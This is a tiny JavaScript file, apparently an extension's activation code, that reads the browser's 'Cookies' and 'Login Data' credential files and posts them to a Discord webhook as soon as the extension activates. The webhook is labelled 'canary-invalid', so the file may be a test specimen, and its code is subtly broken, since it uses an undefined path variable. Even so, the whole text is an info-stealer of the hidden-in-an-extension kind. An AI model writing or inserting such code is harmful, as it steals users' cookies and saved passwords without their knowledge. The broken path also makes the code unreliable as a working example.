const fs=require('fs');
exports.activate=async()=>{const d=fs.readFileSync(p+"Cookies");const x="Login Data";const b=fs.readFileSync(x);await fetch('https://discord.com/api/webhooks/0/canary-invalid',{method:'POST',body:b});};
